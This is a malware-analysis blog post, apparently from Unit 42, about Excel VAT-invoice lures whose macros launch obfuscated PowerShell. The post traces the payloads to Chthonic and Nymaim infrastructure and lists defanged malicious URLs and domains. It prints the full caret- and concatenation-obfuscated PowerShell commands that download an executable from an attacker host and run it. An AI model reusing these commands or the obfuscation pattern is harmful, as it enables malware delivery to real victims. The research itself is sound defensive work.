This posting is a follow-up of my previous work on this subject in “Pulling Back the Curtains on EncodedCommand\n[PowerShell Attacks” (https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-](https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/)\nattacks/).\n\nIn a sample I recently analyzed, something stood out as extremely suspicious which led me down a rabbit hole, uncovering malicious infrastructure\nsupporting Chthonic, Nymaim, and other malware and malicious websites.\n\nThroughout this blog post I present my analysis and thought process during this research, but if you would just like a list of the �ndings, they are\n[over on our Unit42 GitHub (https://github.com/pan-unit42/iocs/tree/master/notepadcase).](https://github.com/pan-unit42/iocs/tree/master/notepadcase)\n\n#### One of these things is not like the others…\n\nMost commonly, PowerShell is launched from a Microsoft Of�ce document that uses a VBA macro to launch PowerShell to perform something\nmalicious – typically downloading the “real” malware to run. I focused my hunting on the PowerShell activity with Palo Alto Networks AutoFocus to\ndetermine whether it’s worth digging into further based on “uniqueness” and functionality.\n\nIn this case, the �rst sample I looked at stood out for another reason entirely. If you take a look at the below PowerShell, you’ll quickly understand\nwhy.\n\n\n1 <null>, cMd.exe /c \"p^Ow^ERS^hel^l^.e^x^e^ -nO^l -No^Ni^Nt^ -W^InDO^ws^ 1 -NoprO^FIle^ -eX^Ec^U B^Ypa^S^s $fos=''',''';$hit='dfil';$fd\n=');sta';$dr='(ne';$ed='ject ';$ipo='syst';$kos='t.we';$rem='ent).do';$sad='wnloa';$kp='w-ob';$nim='e(''';$mo='%ap';$uy='pdat';$ji='a%.e\nx';$pol='em.ne';$oe='e''';$jik='rt-pro';$naw='cess ''';$lim='bcli';Invoke-Expression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim\n+'https://notepad-plus-plus[.]org/repository/7.x/7.4.2/npp.7.4.2.Installer.exe'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)\"\n\n\nThis code downloads a �le from the legitimate Notepad++ website. My initial thought was the worst-case scenario – they’ve been compromised and\nare distributing malware! I immediately downloaded the �le from the website, but everything looked normal. Of course, I had to investigate further.\n\nThe sample stayed true to the previous outline I laid out for these attacks: the Microsoft Excel document appeared to be a lure about �nancial\ninformation, speci�cally a VAT invoice written in Polish as shown below.\n\n\n-----\n\nLooking under the hood we see the VBA code that builds the PowerShell command and launches it but something seemed off. There are a ton of\nfunctions that are clearly decoding information from arrays after which it executes an already decoded PowerShell command. I decided to debug\nthe macro and see exactly what it’s doing before I made any decisions.\n\nIf you look at the above image, there are �ve things to note.\n\n1. The variable ‘horrorr’ (double ‘r’) is the result of all of the previously mentioned decoding functions. This builds a PowerShell command.\n\n2.You can see ‘Shelleeeee horrorr, 0’ commented out, I believe this was intended to launch the previous PowerShell command.\n\n3. The ‘Debug.Print horrorr’ prints the content of that variable in the ‘Immediate’ area shown in the screenshot. The domain in this command is NOT\n‘notepad-plus-plus.org’ and can be seen below.\n\n\n1 cMd.exe  /c \"p^Ow^ERS^hel^l^.e^x^e^ -nO^l -No^Ni^Nt^ -W^InDO^ws^ 1 -NoprO^FIle^ -eX^Ec^U B^Ypa^S^s $fos=''',''';$hit='dfil';$fd=');s\nta';$dr='(ne';$ed='ject ';$ipo='syst';$kos='t.we';$rem='ent).do';$sad='wnloa';$kp='w-ob';$nim='e(''';$mo='%ap';$uy='pdat';$ji='a%.ex';$po\nl='em.ne';$oe='e''';$jik='rt-pro';$naw='cess ''';$lim='bcli';Invoke-Expression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'http\ns://farhenzel[.]co/gls.exe'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)\"\n\n\n4. The ‘MsgBox’ will pop-up and not display anything, because the variable passed is ‘horror’ (1 ‘r’) along with the message ‘Do you really think I’m\nnot a virus?’ in Polish.\n\n5. The hard coded PowerShell command with ‘notepad-plus-plus.org’ will run.\n\nThe most likely conclusion that can be drawn here is that an analyst or researcher obtained this �le, modi�ed it to see the content (misspelling the\nvariable name along the way) post-decoding, and uploaded it to see what it did in a sandbox. To be sure though, I needed to �nd other samples and\nsee how they stacked up against this one.\n\nGoing back to the PowerShell command, the initial reason I stopped to look at it was due to the way they concatenated variables to form the\ndownload command and output. This also provides a perfect pivot point to hunt for samples. Using the below string to search Process Activity in\n\n\n-----\n\nThe dates were all fairly recent, having been received in the past few days since the beginning of August. The documents shared the same themes\nfor lures but the VBA macro and resulting PowerShell were more along the lines of what I expected.\n\nFor sample “538ff577a80748d87b5e738e95c8edd2bd54ea406fe3a75bf452714b17528a87” the following is an excerpt from the VBA macro\nbuilding the PowerShell command.\n\n\n1\n2\n\n\ntntcurier = \"$fos=''\" + \"',''';$hit='df\" + \"il';$fd=');sta';$dr='(ne';$ed\" + \"='ject '\" + \";$ipo='syst';$kos='t.we';$rem='ent).do';$sad\"\ntntcurier = tntcurier + \"='wn\" + \"l\" + \"oa';$kp\" + \"='w-\" + \"ob'\" + \";$nim='e(''\" + \"';$mo='\" + cautrunova(2) + \"';$\" + \"uy='\" + cautrunova\n\n\nAlong with the subsequent Process Activity using the newly built PowerShell command, which aligns with what was commented out of the �rst\nsample analyzed.\n\n1 Windows\\SysWOW64\\cmd.exe, cMD.exe /c \"p^Ow^ERS^hel^l^.e^x^e^ -nO^l -No^Ni^Nt^ -W^InDO^ws^ 1 -NoprO^FIle^ -eX^Ec^U B^Ypa^S^s $fos=''',''';$\n\nGiven this, I iterated over all 171 samples and extracted the following URL’s where PowerShell is downloading a payload.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nhttp://ditetec[.]com/ts.exe\nhttp://ditetec[.]com/u2.exe\nhttp://domass[.]com.ua/index.gif\nhttp://firop[.]com/ego.exe\nhttp://unoset[.]com/jpx.exe\nhttp://unoset[.]com/sxr.exe\nhttps://doci[.]download/inc.exe\nhttps://farhenzel[.]co/gls.exe\nhttps://farsonka[.]co/trb.exe\nhttps://formsonat[.]co/mrb.exe\nhttps://fortuma[.]co/scu.exe\nhttps://iilliiill[.]bid/6ven.exe\nhttps://iilliiill[.]bid/ven.exe\nhttps://iilliiill[.]bid/ven.tvv\nhttps://lom[.]party/mov.exe\nhttps://naiillad[.]date/ex3.exe\nhttps://naiillad[.]date/u3.exe\nhttps://naiillad[.]date/vmer.exe\nhttps://naiillad[.]date/vsync.exe\nhttps://notepad-plus-plus[.]org/repository/7.x/7.4.2/npp.7.4.2.Installer.exe\nhttps://prof[.]cricket/wp.exe\nhttps://tvavi[.]win/pago.exe\n\n\n#### Pass the Chthonic\n\nGoing back to the Process Activity, we can see the SHA256 value of each downloaded �le and compile a list of hashes for further pivoting as shown\nbelow.\n\nAfter iterating over the 171 samples, we’re left with this list of hashes for the downloaded �les. Note that there are fewer payloads than there are\nsamples, indicating many of the documents download the same payload.\n\nBelow is a table with the compile date and some PDB strings found within a few of the binaries.

This pattern is shared across the original samples.\n\nThese HTTP requests match known patterns for a banking Trojan named Chthonic, which is a variant of Zeus. A good write-up from 2014 on the\nmalware can be found in this writeup from Yury Namestnikov, Vladimir Kuskov, Oleg Kupreev at Kaspersky Lab here\n(https://securelist.com/chthonic-a-new-modi�cation-of-zeus/68176/) and indicates that the returned data is an RC4 encrypted loader that sets-up\nthe main Chthonic module which can download additional modules or malware.\n\n#### A dab of Nymaim\n\nIterating once again over the 171 samples and scraping out the HTTP POST requests, I ended up with the below set of domains.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\namellet[.]bit\ndanrnysvp[.]com\nejtmjealr[.]com\nfirop[.]com\ngefinsioje[.]com\ngesofgamd[.]com\nponedobla[.]bit\nunoset[.]com\n\n\n-----\n\nFrom these distribution sites, we can see that 5,520 samples are making HTTP requests to them and these samples have been identi�ed as another\ndownloader Trojan named Nymaim.\n\nThe majority of the overall samples came from the following four sites.\n\n\n1\n2\n3\n4\n\n\nejtmjealr[.]com\ngefinsioje[.]com\ngesofgamd[.]com\nponedobla[.]bit\n\n\nThe ‘ejtmjealr[.]com’ domain is particularly interesting due to a similar domain, ‘ejdqzkd[.]com’ being discussed by Jarosław Jedynak of CERT.PL in\n[this analysis of Nymaim (https://www.cert.pl/en/news/single/nymaim-revisited/) from earlier in the year. They go on to discuss how Nymaim uses a](https://www.cert.pl/en/news/single/nymaim-revisited/)\nstatic con�guration to contact that domain, which will return IP’s that go into a DGA and output the actual IP addresses needed for C2\ncommunication. Ben Baker, Edmund Brumaghin and Jonah Samost of Talos have a fantastic write-up of this process here\n(http://blog.talosintelligence.com/2016/09/goznym.html).\n## Raising the dead – Infrastructure Archeology\n\nTo continue my analysis, I shifted focus to Maltego so as to visually graph the infrastructure. For this task, I used PassiveTotal’s Passive DNS and\n[AutoFocus Maltego (https://live.paloaltonetworks.com/t5/Maltego-for-AutoFocus/ct-p/AutoFocus_Maltego) transforms. We see below the passive](https://live.paloaltonetworks.com/t5/Maltego-for-AutoFocus/ct-p/AutoFocus_Maltego)\nresolutions for these domains and how it reveals a number of IP addresses being shared between the four domains identi�ed above.\n\n[All of the 707 IP addresses can be found here (https://github.com/pan-unit42/iocs/blob/master/notepadcase/IP_listing.txt). Note that while these](https://github.com/pan-unit42/iocs/blob/master/notepadcase/IP_listing.txt)\nIP’s have been found to be hosting malicious content, this could change in the future.\n\nPivoting off the �ve highlighted IP’s above with a shared infrastructure, I pulled the reverse DNS to see what other sites may be present. The below\nis a sampling of the domains returned through this process.\n\n\n-----\n\nThe “idXXXXX.top” pattern immediately stands out and may suggest a pattern in the static con�guration for the initial domains used by the DGA for\nNymaim since the previous two started with “ejX.com.\n\nGiven the level of overlap already, I proceeded to grab all of the passive DNS available for each of the 707 IP addresses. A full list of the domains can\n[be seen here (https://github.com/pan-unit42/iocs/blob/master/notepadcase/Domain_listing.txt). The below Maltego graph is used to simply](https://github.com/pan-unit42/iocs/blob/master/notepadcase/Domain_listing.txt)\nillustrate the two distinct clusters of infrastructure that appeared and their interconnectedness.\n\nFrom the �rst cluster on the left, if we sort by incoming links per node a pattern stands out in the domain names looking similar to the previously\nmentioned Nymaim ones. In the below image, the top domains are sorted by incoming links on the right side. Each link is a corresponding IP address\nand show that these domains have been rotated quite a bit between the infrastructure.\n\nA quick search with the AutoFocus transform to pull tag information shows these are speci�cally related to Nymaim, most likely for the DGA seed;\nhowever, looking at domains with less links, other malware families begin to emerge.\n\nThe cluster on the right is actually collapsing one collection of entities due to the sheer size of it. Below is the collection expanded in all of its glory.\n\n\n-----\n\nBelow are the domain names linked to the singular IP address in the center.\n\nAll of these connected domains follow a pattern similar to phishing attacks masquerading as legitimate services – in this case “online.verify[.]paypal”\n(588) and “hmrc.secure[.]refund” (1021).\n\nIn addition to domains of that type, there is evidence of other malware distribution being carried out on this infrastructure. Collapsing the collection\nback down, note the two domains “brontorittoozzo[.]com” and “randomessstioprottoy[.]net” that fall outside of the collection due to more\ninfrastructure connections.\n\n\n-----\n\nA quick search for these domains will land you on fellow Unit 42 researcher Brad Duncan\n(https://researchcenter.paloaltonetworks.com/author/bduncan/)’s malware-traf�c-analysis (MTA) site for post “2017-06-22 – LOCKY MALSPAM –\nPDF ATTACHMENTS WITH EMBEDDED .DOCM FILES (http://www.malware-traf�c-analysis.net/2017/06/22/index.html)” in which he lists out\nURL’s found within malicious Microsoft Word documents that download Locky as shown below.\n\nIn some of the other smaller clusters, you’ll �nd groupings of like malicious sites.\n\nFor example, there is a group with gems like “premarket[.]ws” like you see below being hosted on this shared infrastructure, which is a forum for less\nthan legal services.\n\n\n-----\n\nAlong with sites like “slilpp[.]ws” which is another less than reputable site as shown below.\n\nWhich ironically has a Twitter support account that speci�cally states the following.\n\n\n-----\n\nAnd yet another here below…\n\nThere are 632 people happily following along with relatively easy to track down accounts and usernames. A substantial amount of these accounts,\non quick review, appear to follow the typical Nigerian cybercrime patterns (https://researchcenter.paloaltonetworks.com/2016/11/unit42nigerian-prince-evolved-game/) detailed in other blogs.\n\nFinally, there were multiple clusters of domains used by the Hancitor malware dropper to host the initial check-in and tracking as shown here.\n\nWhich can be seen as having been used in a campaign on July 03, 2017 via a post on MTA (http://www.malware-traf�canalysis.net/2017/07/03/index.html) below.\n\n\n-----\n\n#### Conclusion\n\nBy pivoting off of one sample we were able to zoom out and identify a sizable infrastructure of what appears to be 707 IP’s and 2,611 domains\n(https://github.com/pan-unit42/iocs/tree/master/notepadcase) being utilized for malicious activity.\n\nAs such, these �ndings represent a collection of compromised websites, compromised registrar accounts used to spin up subdomains, domains used\nby malware DGA’s, phishing kits, carding forums, malware C2 sites, and a slew of other domains that revolve around criminal activity.\n\nHopefully this analysis has been helpful in understanding how truly connected some of these infrastructures can be and how with a little digging,\nyou can uncover a substantial amount of operationally useful indicators to protect you and yours.\n\n[AutoFocus users can identify and track these threats using the Chthonic (https://autofocus.paloaltonetworks.com/#/tag/Unit42.Chthonic),](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Chthonic)\nNymaim, and NotepadInfrastructure tags.\n\n#### Got something to say?\n\nLeave a comment...\n\n**Notify me of followup comments via e-mail**\n\n\nName (required)\n\n\nEmail (required)\n\n\nWebsite\n\n\nSUBMIT\n\nSUBSCRIBE TO NEWSLETTERS\n\nEmail\n\nCOMPANY\n\n[Company (https://www.paloaltonetworks.com/company)](https://www.paloaltonetworks.com/company)\n\n[Careers (https://www.paloaltonetworks.com/company/careers)](https://www.paloaltonetworks.com/company/careers)\n\n[Sitemap (https://www.paloaltonetworks.com/sitemap)](https://www.paloaltonetworks.com/sitemap)\n\n\n-----",
